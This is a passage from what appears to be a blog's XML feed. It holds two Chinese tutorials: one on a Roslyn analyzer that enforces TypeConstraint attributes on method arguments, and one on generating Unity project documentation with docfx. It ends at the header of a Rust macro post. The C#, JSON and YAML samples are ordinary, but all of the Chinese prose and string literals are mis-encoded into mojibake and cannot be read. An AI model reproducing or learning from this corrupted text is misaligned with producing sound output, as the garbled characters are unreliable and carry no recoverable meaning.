å°±ä¼šå¼‚å¸¸ï¼Œå…·ä½“çš„è¡¨ç°å°±æ˜¯åœ¨åˆ«çš„é¡¹ç›®é‡Œä½¿ç”¨è¯¥åˆ†æå™¨çš„æ—¶å€™ä¼šæ²¡æœ‰ä»»ä½•è¡¨ç°ï¼ˆå› ä¸ºåˆ†æå™¨è¿è¡Œåˆ°è¿™é‡Œå°±å´©æºƒäº†ï¼‰</p></blockquote><h3 id="åˆ†æè°ƒç”¨"><a href="#åˆ†æè°ƒç”¨" class="headerlink" title="åˆ†æè°ƒç”¨"></a>åˆ†æè°ƒç”¨</h3><p>æ³¨å†Œä¸€ä¸ªæ–°çš„è¡Œä¸ºï¼Œè¿™æ¬¡æˆ‘ä»¬æ³¨å†Œåˆ° <code>SyntaxNodeAction</code> ï¼ˆå› ä¸ºè¿™ä¸ªæ˜¯åœ¨ <code>SymbolAction</code> ä¹‹åæ‰§è¡Œçš„ï¼Œä¸è¿‡æˆ‘çŒœè¿™ä¸€æ­¥æ³¨å†Œ <code>SymbolAction</code> åº”è¯¥æ²¡å•¥é—®é¢˜ï¼‰</p><p>ç„¶ååˆ†æçš„ç›®æ ‡æ˜¯è°ƒç”¨è¡¨è¾¾å¼ï¼ˆ<code>Invocation Expression</code>ï¼‰</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Initialize</span>(<span class="params">AnalysisContext context</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    context.RegisterSyntaxNodeAction(AnalyzeMethodCall, SyntaxKind.InvocationExpression);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AnalyzeMethodCall</span>(<span class="params">SyntaxNodeAnalysisContext context</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­è¢«è°ƒç”¨çš„å‡½æ•°æ˜¯ä¸æ˜¯æœ‰ <code>[TypeConstraint(...)]</code> é™å®šè¿‡çš„å‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯æ£€æŸ¥æ˜¯ä¸æ˜¯åœ¨ä¹‹å‰å‚¨å­˜çš„é‚£ä¸ªå­—å…¸å°±è¡Œï¼‰ï¼Œå¹¶è·å–è°ƒç”¨æ—¶çš„å®å‚ï¼Œä»¥åŠå®šä¹‰æ—¶çš„å‚æ•°ä¿¡æ¯</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AnalyzeMethodCall</span>(<span class="params">SyntaxNodeAnalysisContext context</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> invocation = (InvocationExpressionSyntax)context.Node;</span><br><span class="line">    <span class="keyword">if</span> (context.SemanticModel.GetSymbolInfo(invocation).Symbol <span class="keyword">is</span> <span class="keyword">not</span> IMethodSymbol methodSymbol</span><br><span class="line">        || MethodConstraints.ContainsKey(methodSymbol) <span class="keyword">is</span> <span class="literal">false</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> parametersConstraints = MethodConstraints[methodSymbol];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> arguments = invocation.ArgumentList.Arguments;</span><br><span class="line">    <span class="keyword">var</span> parameters = methodSymbol.Parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åéå†å‚æ•°ï¼Œå¹¶åˆ¤æ–­æ˜¯å¦æ»¡è¶³é™åˆ¶ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ arg å’Œ param è¦å¯¹åº”ä¸Š</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">var</span> (argument, parameter) <span class="keyword">in</span> arguments.Zip(parameters, (arg, param) =&gt; (arg, param)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> argumentType = context.SemanticModel.GetTypeInfo(argument.Expression).Type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (parametersConstraints.TryGetValue(parameter, <span class="keyword">out</span> <span class="keyword">var</span> allowedTypes))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> isValid = allowedTypes.Any(allowed =&gt;</span><br><span class="line">            SymbolEqualityComparer.Default.Equals(allowed, argumentType) ||</span><br><span class="line">            argumentType.AllInterfaces.Any(i =&gt; SymbolEqualityComparer.Default.Equals(i, allowed)) ||</span><br><span class="line">            (argumentType.BaseType != <span class="literal">null</span> &amp;&amp; SymbolEqualityComparer.Default.Equals(argumentType.BaseType, allowed)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯æ ¹æ®å®å‚æ˜¯å¦åˆæ³•ï¼Œæ¥æŠ›å‡ºæç¤ºå°±è¡Œäº†ã€‚æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæ–°çš„è§„åˆ™ï¼Œæ¯”å¦‚è¿™æ ·ï¼š</p><blockquote><p>  è¿™é‡Œåº”è¯¥ä¹Ÿä¼šæœ‰ä¸€ä¸ªè­¦å‘Šï¼Œæ‡’å¾—æä¹Ÿæ˜¯åœ¨æ–‡ä»¶å¼€å¤´åŠ ä¸€è¡Œï¼š <code>#pragma warning disable RS2008</code></p><p>  ä¹Ÿå¯ä»¥æŒ‰ç…§å®˜æ–¹çš„è¯´æ˜ï¼š<a href="https://github.com/dotnet/roslyn-analyzers/blob/main/src/Microsoft.CodeAnalysis.Analyzers/ReleaseTrackingAnalyzers.Help.md">https://github.com/dotnet/roslyn-analyzers/blob/main/src/Microsoft.CodeAnalysis.Analyzers/ReleaseTrackingAnalyzers.Help.md</a></p><p>  åˆ›å»º <code>AnalyzerReleases.Unshipped.md</code> å’Œ <code>AnalyzerReleases.Shipped.md</code> ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”æŒ‰ç…§æ ¼å¼æŠŠè§„åˆ™ä¿¡æ¯è¡¥å……ï¼ˆ</p></blockquote><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> DiagnosticDescriptor Rule = <span class="keyword">new</span> DiagnosticDescriptor(</span><br><span class="line">    id: <span class="string">&quot;ANALY001&quot;</span>,</span><br><span class="line">    title: <span class="string">&quot;æ— æ•ˆçš„å‚æ•°ç±»å‹&quot;</span>,</span><br><span class="line">    messageFormat: <span class="string">&quot;å‚æ•°ç±»å‹ &#x27;&#123;0&#125;&#x27; ä¸æ»¡è¶³ TypeConstraintAttribute ä¸­çš„çº¦æŸæ¡ä»¶, ç±»å‹ &#x27;&#123;0&#125;&#x27; éœ€è¦ä¸º &#x27;&#123;1&#125;&#x27; ä¸­çš„ä¸€ç§, æˆ–æ´¾ç”Ÿäºå…¶ä¸­ä¹‹ä¸€ã€‚&quot;</span>,</span><br><span class="line">    category: <span class="string">&quot;Usage&quot;</span>,</span><br><span class="line">    defaultSeverity: DiagnosticSeverity.Error,</span><br><span class="line">    isEnabledByDefault: <span class="literal">true</span>,</span><br><span class="line">    description: <span class="string">&quot;å‚æ•°ç±»å‹ä¸æ»¡è¶³ TypeConstraintAttribute ä¸­çš„çº¦æŸæ¡ä»¶&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">override</span> ImmutableArray&lt;DiagnosticDescriptor&gt; SupportedDiagnostics =&gt; ImmutableArray.Create(Rule);</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨åŸæ¥æ£€æµ‹çš„åœ°æ–¹è·å–ä¸Šä¸‹æ–‡å¹¶æŠ›å‡ºé”™è¯¯</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isValid <span class="keyword">is</span> <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> diagnostic = Diagnostic.Create(Rule, argument.GetLocation(), argumentType, <span class="built_in">string</span>.Join(<span class="string">&quot;, &quot;</span>, allowedTypes.Select(type =&gt; type.Name)));</span><br><span class="line">    context.ReportDiagnostic(diagnostic);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åœ¨-Unity-ä¸­ä½¿ç”¨åˆ†æå™¨"><a href="#åœ¨-Unity-ä¸­ä½¿ç”¨åˆ†æå™¨" class="headerlink" title="åœ¨ Unity ä¸­ä½¿ç”¨åˆ†æå™¨"></a>åœ¨ Unity ä¸­ä½¿ç”¨åˆ†æå™¨</h2><p>æŠŠé¡¹ç›® build ä¸€ä¸‹ï¼ŒæŠŠ dll æ–‡ä»¶æŒ‰ç…§ Unity å®˜æ–¹æ‰‹å†Œçš„è¯´æ˜ <a href="https://docs.unity3d.com/cn/2022.3/Manual/roslyn-analyzers.html">https://docs.unity3d.com/cn/2022.3/Manual/roslyn-analyzers.html</a> åº”ç”¨åˆ°é¡¹ç›®ä¸­ï¼Œä¹‹åå°±å¯ä»¥æµ‹è¯•äº†ã€‚</p><blockquote><p>  åœ¨å‰é¢çš„å®ç°ä¸­ï¼Œæˆ‘ç”±äºæ˜¯åˆ¤æ–­åªæœ‰æ»¡è¶³å¤šä¸ªé™åˆ¶ä¸­çš„ä¸€ä¸ªå°±è¡Œï¼Œæ‰€ä»¥å¤šä¸ªç±»å‹ä¹‹é—´å…¶å®æ˜¯ <code>or</code> çš„å…³ç³»ã€‚</p><p>  åœ¨æœ€å¼€å§‹æˆ‘è¯´å®šä¹‰ <code>TypeConstraintAttribute</code> çš„æ—¶å€™ï¼Œå¯ä»¥æŠŠ <code>AllowMultiple</code> è®¾ç½®ä¸º trueï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥è€ƒè™‘å¤šä¸ª <code>[TypeConstraint(...)]</code> ä¹‹é—´æ˜¯ <code>and</code> å…³ç³»ï¼Œè¿™é‡Œæˆ‘å°±ä¸å®ç°äº†ï¼ˆ</p></blockquote><p><img src="/CSharp%E5%AE%9E%E7%8E%B0%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E9%99%90%E5%AE%9A/Test.png" alt="Test"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸¸æˆå¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> CSharp </tag>
            
            <tag> Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unity é¡¹ç›®æ–‡æ¡£ç”Ÿæˆ</title>
      <link href="/Unity-%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3%E7%94%9F%E6%88%90/"/>
      <url>/Unity-%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<h1 id="Unity-é¡¹ç›®æ–‡æ¡£ç”Ÿæˆ"><a href="#Unity-é¡¹ç›®æ–‡æ¡£ç”Ÿæˆ" class="headerlink" title="Unity é¡¹ç›®æ–‡æ¡£ç”Ÿæˆ"></a>Unity é¡¹ç›®æ–‡æ¡£ç”Ÿæˆ</h1><p>å¯¹äº C# é¡¹ç›®æ¥è¯´ï¼Œå¯ä»¥ä½¿ç”¨ docfx è¿™ä¸ªå¼€æºå·¥å…·æ¥ç”Ÿæˆä»£ç æ–‡æ¡£ï¼Œè¿™ä¸ªå·¥å…·ä¹ŸåŒæ ·èƒ½ç”¨åœ¨ Unity çš„é¡¹ç›®ä¸­ã€‚</p><span id="more"></span><p>ä»¥æˆ‘çš„ KimerA æ¡†æ¶çš„é¡¹ç›®ç»“æ„ä¸ºä¾‹å§ï¼š</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KimerA</span><br><span class="line">â”œâ”€Docs</span><br><span class="line">â””â”€Src</span><br><span class="line">    â”œâ”€KimerA</span><br><span class="line">    â”‚  â”œâ”€<span class="string">.vscode</span></span><br><span class="line">    â”‚  â”œâ”€Assets</span><br><span class="line"><span class="string">......</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <strong>KimerA&#x2F;Src&#x2F;KimerA</strong> å°±æ˜¯ unity é¡¹ç›®çš„æ ¹ç›®å½•ã€‚</p><blockquote><p>  é¦–å…ˆä¿è¯è‡³å°‘æœ‰ DotNet8 çš„ç¯å¢ƒ</p><p>  è¿è¡Œ <code>dotnet tool update -g docfx</code> æ¥å…¨å±€å®‰è£… docfx å·¥å…·</p></blockquote><p><em>å…³äº docfx çš„å…¥é—¨ï¼Œå»ºè®®ç›´æ¥çœ‹å®˜æ–¹çš„  <a href="https://dotnet.github.io/docfx/index.html">https://dotnet.github.io/docfx/index.html</a></em></p><p>åœ¨ <strong>KimerA&#x2F;Docs</strong> æ‰“å¼€ä¸€ä¸ªç»ˆç«¯ï¼Œè¾“å…¥ <code>docfx init</code> åˆå§‹åŒ–ç›¸å…³è®¾ç½®</p><p>ç„¶ååº”è¯¥å°±çœ‹åˆ°äº† Docs æ–‡ä»¶å¤¹ä¸‹å¤šäº† <code>docfx.json, index.md, toc.yml</code>  è¿™ä¸‰ä¸ªæ–‡ä»¶</p><blockquote><p>  å¯åŠ¨ docfx æœåŠ¡åçš„ä¸»ç•Œé¢å°±æ˜¯æ ¹æ® index.md æ¥çš„</p><p>  toc.yml ï¼ˆTable of Configï¼‰ï¼Œå°±å’Œåå­—ä¸€æ ·ï¼Œæ˜¯æŒ‡ç¤ºæ–‡æ¡£ç»“æ„çš„</p><p>  docfx.json å°±æ˜¯ç”Ÿæˆæ–‡æ¡£æ—¶çš„ç›¸å…³é…ç½®</p></blockquote><p>docfx.json ä¸­ metadata -&gt; src åº”è¯¥é»˜è®¤æ˜¯æŒ‡å‘ä¸€ä¸ª .csproj è·¯å¾„ï¼Œä½†æ˜¯å¯¹äº unity é¡¹ç›®ï¼Œå»ºè®®æ”¹æˆ .cs æ–‡ä»¶çš„è·¯å¾„</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹çš„ docfx.json æ–‡ä»¶å†…å®¹ï¼Œï¼ˆå½“ç„¶ï¼Œç”±äºæˆ‘æ˜¯ä¸ºäº†æ‰“åŒ…æˆ unitypackage æˆ‘æ‰æ”¾åˆ° Plugins ä¸‹é¢ï¼Œå¦‚æœåªæ˜¯è¦ç»™é¡¹ç›®æ ¸å¿ƒé€»è¾‘çš„å“ªäº›è„šæœ¬ç”Ÿæˆæ–‡æ¡£ï¼Œå¤§å¯æ”¹æˆç±»ä¼¼  <code>TestProj/Assets/Scripts/*.cs</code> ,  <code>TestProj/Assets/Scripts/**/*.cs</code> è¿™æ ·çš„ï¼‰</p><blockquote><p>  éœ€è¦è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆåœ¨ metadata ä¸­ä¼šæ·»åŠ ä¸€ä¸ª   <code>&quot;references&quot;: [ &quot;*.dll&quot; ]</code></p><p>  å› ä¸ºæˆ‘ä¾èµ–äº† UnityEngineï¼Œæ‰€ä»¥å½“ docfx å°è¯• build çš„æ—¶å€™ï¼ˆç”Ÿæˆæ–‡æ¡£å‰ä¼šå…ˆbuildï¼‰å°±ä¼šç¼ºå°‘ä¾èµ–ï¼Œæˆ‘çš„åšæ³•æ˜¯ç›´æ¥å»ç¼–è¾‘å™¨æ–‡ä»¶å¤¹ä¸‹é¢å¤åˆ¶äº†ä¸€ä¸ª UnityEngine.dll ï¼ˆä¸çŸ¥é“æœ‰æ²¡æœ‰æ›´å¥½çš„åŠæ³•ï¼‰</p><p>  ç„¶å â€œreferencesâ€ å­—æ®µéœ€è¦çš„æ˜¯æ¨¡å¼ï¼Œå¯ä»¥å¡«  â€œUnityEngine.dllâ€, â€œ*.dllâ€ï¼Œä½†æ˜¯ä¸èƒ½ â€œ.&#x2F;UnityEngine.dllâ€</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;KimerA/Assets/Plugins/KimerA/Runtime/**/*.cs&quot;</span></span><br><span class="line">          <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../Src&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;dest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;api&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;disableGitFeatures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;disableDefaultFilter&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;references&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;*.dll&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;globalMetadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;_disableContribution&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;_appTitle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;KimerA&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;api/**.yml&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;api/index.md&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;articles/**.md&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;articles/**/toc.yml&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;toc.yml&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;*.md&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;images/**&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;overwrite&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;apidoc/**.md&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;exclude&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;obj/**&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;_site/**&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;_site&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;globalMetadataFiles&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;fileMetadataFiles&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;default&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;modern&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;postProcessors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;markdownEngineName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;markdig&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;noLangKeyword&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keepFileLink&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cleanupCacheHistory&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>toc.yml</strong></p><blockquote><p>  ç”Ÿæˆçš„ yml æ–‡ä»¶åæ˜¯æ ¹æ®å‘½åç©ºé—´æ¥çš„ï¼Œæˆ‘å¸Œæœ›ä¸€æ‰“å¼€å°±æ˜¯ <code>KimerA.Core</code> è¿™ä¸ªå‘½åç©ºé—´å†…çš„ä¸œè¥¿ï¼Œé‚£ä¹ˆ homepage å°±è¿™ä¹ˆå†™ï¼ˆ</p></blockquote><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">KimerA</span> <span class="string">API</span> <span class="string">Documentation</span></span><br><span class="line">  <span class="attr">href:</span> <span class="string">api/</span></span><br><span class="line">  <span class="attr">homepage:</span> <span class="string">api/KimerA.Core.yml</span></span><br></pre></td></tr></table></figure><p>ç„¶å index.md é‡Œé¢éšä¾¿å†™ç‚¹ä¸œè¥¿ï¼Œå°±å¯ä»¥ç›´æ¥ <code>docfx .\docfx.json --serve</code> äº†</p><img src="/Unity-%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3%E7%94%9F%E6%88%90/Home.png" alt="Home" style="zoom:67%;"><p>ç‚¹ä¸Šæ–¹æŒ‰é’®è¿›å»å°±æ˜¯å¤§æ¦‚è¿™æ ·</p><img src="/Unity-%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3%E7%94%9F%E6%88%90/Core.png" alt="Core" style="zoom: 67%;"><h2 id="ä¸€äº›å¯èƒ½çš„é—®é¢˜"><a href="#ä¸€äº›å¯èƒ½çš„é—®é¢˜" class="headerlink" title="ä¸€äº›å¯èƒ½çš„é—®é¢˜"></a>ä¸€äº›å¯èƒ½çš„é—®é¢˜</h2><ul><li><p>ä½¿ç”¨äº† unsafe ä»£ç ï¼Œæ— æ³•ç›´æ¥ç¼–è¯‘</p><blockquote><p>  å¯ä»¥åœ¨ docfx.json ä¸­çš„ metadata ä¸­æ·»åŠ  <code>&quot;properties&quot;: &#123; &quot;AllowUnsafeBlocks&quot;: &quot;true&quot; &#125;</code></p><p>  ä½†æ˜¯è¦æ³¨æ„ï¼Œ properties ä¸­çš„å±æ€§çš„å€¼éƒ½å¿…é¡»æ˜¯ String ç±»å‹ï¼Œè¿™é‡Œå¡«  true ä¼šæ— æ³•è§£æï¼ˆx</p></blockquote></li><li><p>æœ€è¿‘ä½¿ç”¨çš„æ—¶å€™é‡åˆ°äº† UnityEngine.dll ä¸­ç¼ºå°‘ç¬¦å·çš„é—®é¢˜ï¼Œå¤§æ¦‚æ˜¯ UnityEngine.dll è¿˜ä¼šä¾èµ–å…¶ä»–çš„ dllï¼Œæ‰€ä»¥æˆ‘ç›´æ¥æŠŠ editor é‡Œé¢çš„ <code>Data/Managed/UnityEngine/</code> è¿™ä¸ªç›®å½•ä¸€èµ·å¤åˆ¶è¿‡å»äº†ï¼Œç„¶åæŠŠé…ç½®æ–‡ä»¶é‡Œé¢çš„ references æ”¹æˆ <code>&quot;UnityEngine/*.dll&quot;</code> å°±å¯ä»¥äº†ã€‚</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¸¸æˆå¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unity </tag>
            
            <tag> Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rustå®é­”æ³•-2</title>
      <link href="/rust%E5%AE%8F%E9%AD%94%E6%B3%95-2/"/>
      <url>/rust%E5%AE%8F%E9%AD%94%E6%B3%95-2/</url>
      
